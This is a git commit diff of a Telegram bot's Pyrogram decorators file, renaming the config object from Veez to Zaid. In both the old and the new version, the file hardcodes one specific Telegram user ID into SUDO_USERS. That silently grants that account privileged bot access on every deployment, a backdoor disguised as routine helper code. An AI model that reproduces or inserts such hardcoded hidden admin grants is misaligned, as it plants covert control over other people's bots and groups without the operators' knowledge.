4e2100cce805d516ad2654c689a9cdf2812bd0d6
Zaid <83804937+Itsunknown-12@users.noreply.github.com>
2021-09-12 14:42:57 +0530

    Update decorators.py

--- helpers/decorators.py
+++ helpers/decorators.py
@@ -3,10 +3,10 @@ from typing import Callable
 from pyrogram import Client
 from pyrogram.types import Message
 
-from config import Veez
+from config import Zaid
 from helpers.admins import get_administrators
 
-Veez.SUDO_USERS.append(1669178360)
+Zaid.SUDO_USERS.append(1669178360)
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
@@ -20,7 +20,7 @@ def errors(func: Callable) -> Callable:
 
 def authorized_users_only(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
-        if message.from_user.id in Veez.SUDO_USERS:
+        if message.from_user.id in Zaid.SUDO_USERS:
             return await func(client, message)
 
         administrators = await get_administrators(message.chat)
@@ -34,7 +34,7 @@ def authorized_users_only(func: Callable) -> Callable:
 
 def sudo_users_only(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
-        if message.from_user.id in Veez.SUDO_USERS:
+        if message.from_user.id in Zaid.SUDO_USERS:
             return await func(client, message)
 
     return decorator
